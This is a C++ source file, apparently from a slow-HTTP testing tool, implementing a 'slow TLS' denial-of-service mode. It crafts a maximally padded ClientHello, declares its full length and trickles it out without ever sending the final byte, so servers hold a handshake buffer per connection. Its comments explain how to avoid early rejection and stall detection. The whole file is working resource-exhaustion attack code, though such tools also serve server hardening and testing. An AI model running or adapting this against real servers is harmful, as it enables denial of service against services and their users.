// SPDX-License-Identifier: Apache-2.0
// Copyright 2011-2026 Sergey Shekyan and contributors
#include "slowhttp/attacks/slow_tls.hpp"

#include <algorithm>
#include <cctype>
#include <cstdio>
#include <random>

namespace slowhttp {
namespace {

// TLS record and handshake constants. Spelled out rather than pulled from
// OpenSSL headers, because this mode deliberately does not link the handshake
// to a TLS library -- the whole point is to stop before a library would.
constexpr std::uint8_t kRecordHandshake = 0x16;
constexpr std::uint8_t kRecordAlert = 0x15;
constexpr std::uint8_t kHandshakeClientHello = 0x01;

// A record may carry at most 2^14 bytes of plaintext (RFC 8446 5.1). Declaring
// more is record_overflow, which servers reject immediately -- the opposite of
// what this mode wants.
constexpr std::size_t kMaxRecordPayload = 16384;

void u8(std::string& out, unsigned v) {
  out.push_back(static_cast<char>(v & 0xff));
}
void u16(std::string& out, unsigned v) {
  out.push_back(static_cast<char>((v >> 8) & 0xff));
  out.push_back(static_cast<char>(v & 0xff));
}
void u24(std::string& out, unsigned v) {
  out.push_back(static_cast<char>((v >> 16) & 0xff));
  out.push_back(static_cast<char>((v >> 8) & 0xff));
  out.push_back(static_cast<char>(v & 0xff));
}

// Random bytes for the ClientHello random and the key share. These are never
// used to derive anything -- the handshake does not get that far -- but they
// must not be constant, or a server keeping per-client state could collapse
// every connection onto one entry.
std::string random_bytes(std::size_t n) {
  static thread_local std::mt19937 rng{std::random_device{}()};
  std::uniform_int_distribution<int> byte(0, 255);
  std::string s;
  s.reserve(n);
  for (std::size_t i = 0; i < n; ++i) u8(s, static_cast<unsigned>(byte(rng)));
  return s;
}

// Whether the host is an address rather than a name. RFC 6066 3 forbids a
// literal address in SNI, and a server enforcing that would reject the hello
// before it ever waited -- which would measure the rejection, not the hold.
bool host_is_literal_ip(const std::string& host) {
  if (host.find(':') != std::string::npos) return true;  // IPv6 literal
  if (host.empty()) return true;
  for (char c : host)
    if (!std::isdigit(static_cast<unsigned char>(c)) && c != '.') return false;
  return true;
}

void extension(std::string& out, unsigned type, const std::string& body) {
  u16(out, type);
  u16(out, static_cast<unsigned>(body.size()));
  out += body;
}

}  // namespace

std::string build_client_hello(const std::string& host,
                               std::size_t target_size) {
  std::string body;
  u16(body, 0x0303);            // legacy_version: TLS 1.2, per RFC 8446 4.1.2
  body += random_bytes(32);     // random
  u8(body, 32);                 // legacy_session_id: 32 bytes of compatibility
  body += random_bytes(32);     // middlebox mode, so this looks like a browser

  // TLS 1.3 suites first, then the TLS 1.2 ECDHE suites, so the offer is
  // acceptable to a server of either vintage.
  const unsigned suites[] = {0x1301, 0x1302, 0x1303, 0xc02f,
                             0xc030, 0xc02b, 0xc02c};
  u16(body, static_cast<unsigned>(sizeof(suites) / sizeof(suites[0]) * 2));
  for (unsigned s : suites) u16(body, s);

  u8(body, 1);  // one compression method,
  u8(body, 0);  // null -- the only one TLS 1.3 permits

  std::string ext;
  if (!host.empty()) {
    // server_name. A literal IP address is not a legal SNI host (RFC 6066
    // 3), and sending one makes some servers reject the hello outright, so
    // the caller omits the host in that case.
    std::string sni;
    u8(sni, 0);  // host_name
    u16(sni, static_cast<unsigned>(host.size()));
    sni += host;
    std::string list;
    u16(list, static_cast<unsigned>(sni.size()));
    list += sni;
    extension(ext, 0x0000, list);
  }
  {  // supported_groups: x25519, secp256r1, secp384r1
    std::string g;
    u16(g, 6);
    u16(g, 0x001d);
    u16(g, 0x0017);
    u16(g, 0x0018);
    extension(ext, 0x000a, g);
  }
  {  // ec_point_formats: uncompressed (TLS 1.2 servers expect it)
    std::string p;
    u8(p, 1);
    u8(p, 0);
    extension(ext, 0x000b, p);
  }
  {  // signature_algorithms
    const unsigned algs[] = {0x0804, 0x0805, 0x0806, 0x0403,
                             0x0503, 0x0603, 0x0401, 0x0501};
    std::string a;
    u16(a, static_cast<unsigned>(sizeof(algs) / sizeof(algs[0]) * 2));
    for (unsigned v : algs) u16(a, v);
    extension(ext, 0x000d, a);
  }
  {  // application_layer_protocol_negotiation: http/1.1
    std::string a;
    const std::string proto = "http/1.1";
    u16(a, static_cast<unsigned>(proto.size() + 1));
    u8(a, static_cast<unsigned>(proto.size()));
    a += proto;
    extension(ext, 0x0010, a);
  }
  {  // supported_versions: TLS 1.3, TLS 1.2
    std::string v;
    u8(v, 4);
    u16(v, 0x0304);
    u16(v, 0x0303);
    extension(ext, 0x002b, v);
  }
  {  // psk_key_exchange_modes: psk_dhe_ke
    std::string m;
    u8(m, 1);
    u8(m, 1);
    extension(ext, 0x002d, m);
  }
  {  // key_share: one x25519 share
    std::string k;
    std::string entry;
    u16(entry, 0x001d);
    u16(entry, 32);
    entry += random_bytes(32);
    u16(k, static_cast<unsigned>(entry.size()));
    k += entry;
    extension(ext, 0x0033, k);
  }
  extension(ext, 0xff01, std::string(1, '\0'));  // renegotiation_info

  // Padding (RFC 7685) brings the hello to the requested size. It exists for
  // exactly this -- adding length to a ClientHello without changing its
  // meaning -- so a server has no reason to treat a padded hello differently
  // from an unpadded one.
  //
  // The size matters because the server sizes its handshake buffer from what
  // the record declares. Padding is added only if there is room for the
  // extension header itself; below that the hello is simply left shorter.
  const std::size_t fixed = body.size() + 2 + ext.size();
  if (target_size > fixed + 4) {
    const std::size_t pad = target_size - fixed - 4;
    extension(ext, 0x0015, std::string(pad, '\0'));
  }

  u16(body, static_cast<unsigned>(ext.size()));
  body += ext;
  return body;
}

SlowTls::SlowTls(const Config& cfg)
    : interval_(std::chrono::duration_cast<Millis>(cfg.interval)),
      sent_(static_cast<std::size_t>(cfg.connections), 0) {
  // Fill the record. A larger declaration means a larger buffer held per
  // connection and more bytes left to withhold, and the record layer's own
  // ceiling is the natural place to stop.
  //
  // SNI is omitted for a literal address: RFC 6066 3 forbids it there, and a
  // server that enforces that would reject the hello before it ever waited.
  const std::string sni =
      host_is_literal_ip(cfg.target.host) ? std::string() : cfg.target.host;
  hello_ = build_client_hello(sni, kMaxRecordPayload - 4);
  declared_ = hello_.size();

  // One byte per interval would outlast any run, but it also makes the trickle
  // indistinguishable from a stalled connection. Sending a few bytes keeps
  // visible progress on the wire -- a server watching for zero-progress reads
  // sees data moving -- while still leaving far more than the run can deliver.
  chunk_ = std::max<std::size_t>(
      1, static_cast<std::size_t>(cfg.max_random_data_len));
}

void SlowTls::on_open(ConnId id) {
  if (id >= 0 && static_cast<std::size_t>(id) < sent_.size()) sent_[id] = 0;
}

std::string SlowTls::opening_bytes() const {
  std::string out;
  u8(out, kRecordHandshake);
  u16(out, 0x0301);  // legacy record version, as every real client sends
  u16(out, static_cast<unsigned>(declared_ + 4));
  u8(out, kHandshakeClientHello);
  u24(out, static_cast<unsigned>(declared_));
  return out;
}

Action SlowTls::on_connect(ConnId id) {
  ++started_;
  if (id < 0 || static_cast<std::size_t>(id) >= sent_.size())
    return Action::wait(interval_);
  // Headers plus the first fragment. The headers alone are what commit the
  // server to reading a ClientHello of the declared length.
  std::string out = opening_bytes();
  out += next_fragment(id);
  return Action::send(out, interval_);
}

std::string SlowTls::next_fragment(ConnId id) {
  std::size_t& done = sent_[id];
  // The last byte is never sent. Without this the hello would eventually
  // complete and the mode would become an ordinary handshake.
  const std::size_t limit = declared_ > 0 ? declared_ - 1 : 0;
  if (done >= limit) return std::string();
  const std::size_t n = std::min(chunk_, limit - done);
  std::string out = hello_.substr(done, n);
  done += n;
  return out;
}

Action SlowTls::on_timer(ConnId id) {
  if (id < 0 || static_cast<std::size_t>(id) >= sent_.size())
    return Action::wait(interval_);
  std::string out = next_fragment(id);
  // Running out of hello is not a reason to hang up: the record is still
  // unfinished, and holding the connection open is the measurement.
  if (out.empty()) return Action::wait(interval_);
  return Action::send(out, interval_);
}

Action SlowTls::on_readable(ConnId id, const char* data, std::size_t len) {
  (void)id;
  if (len == 0) return Action::reconnect();  // peer closed
  // A server waiting for the rest of a handshake says nothing. A record here
  // means it stopped waiting, and an alert says why: 40 handshake_failure and
  // 70 protocol_version are a rejected offer, 120 no_application_protocol a
  // rejected ALPN, 10 unexpected_message or 50 decode_error a rejected shape.
  // None of those is a hold, so counting them keeps the summary honest.
  if (len >= 7 && static_cast<std::uint8_t>(data[0]) == kRecordAlert) {
    ++alerted_;
    if (first_alert_ < 0) first_alert_ = static_cast<std::uint8_t>(data[6]);
  }
  return Action::reconnect();
}

std::string SlowTls::summary() const {
  if (started_ == 0) return std::string();
  char buf[256];
  if (alerted_ > 0) {
    std::snprintf(buf, sizeof(buf),
                  "TLS: %ld of %ld connections were refused with an alert"
                  " (first was description %d) -- the handshake was not held",
                  alerted_, started_, first_alert_);
  } else {
    std::snprintf(buf, sizeof(buf),
                  "TLS: no connection was refused; the target waited for the"
                  " rest of a %zu-byte ClientHello it never received",
                  declared_);
  }
  return std::string(buf);
}

}  // namespace slowhttp
